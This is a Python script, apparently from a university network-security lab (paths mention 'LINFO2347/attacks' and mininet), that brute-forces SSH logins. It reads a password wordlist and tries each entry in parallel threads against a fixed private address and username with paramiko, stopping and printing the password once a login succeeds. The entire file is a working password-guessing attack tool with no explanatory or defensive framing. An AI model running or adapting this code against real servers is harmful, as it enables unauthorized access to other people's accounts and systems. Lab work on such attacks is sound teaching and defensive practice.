from pathlib import Path
import paramiko
from concurrent.futures import ThreadPoolExecutor
import threading

stop_event = threading.Event()

def attempt_connect(hostname, username, password):
    if stop_event.is_set():
        return None

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, username=username, password=password, timeout=10)
        print(f"Success! Connected with password: {password}")
        stop_event.set()
        return password
    except paramiko.AuthenticationException:
        print(f"Failed password: {password}")
    except paramiko.SSHException as e:
        print(f"SSH exception occurred: {e}")
    finally:
        client.close()
    return None

def ssh_bruteforce(hostname: str, username: str, password_file_path: Path):
    with open(password_file_path, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    with ThreadPoolExecutor(max_workers=7) as executor:
        futures = [executor.submit(attempt_connect, hostname, username, password) for password in passwords]
        for future in futures:
            result = future.result()
            if result:
                return result

    print("No valid password found.")
    return None

if __name__ == '__main__':
    hostname = '10.12.0.10'
    username = 'mininet'
    result = ssh_bruteforce(hostname, username, Path('/home/mininet/LINFO2347/attacks/passwords.txt'))
    if result:
        print(f"Brute-force successful: {result}")
    else:
        print("Brute-force failed: No valid password found.")

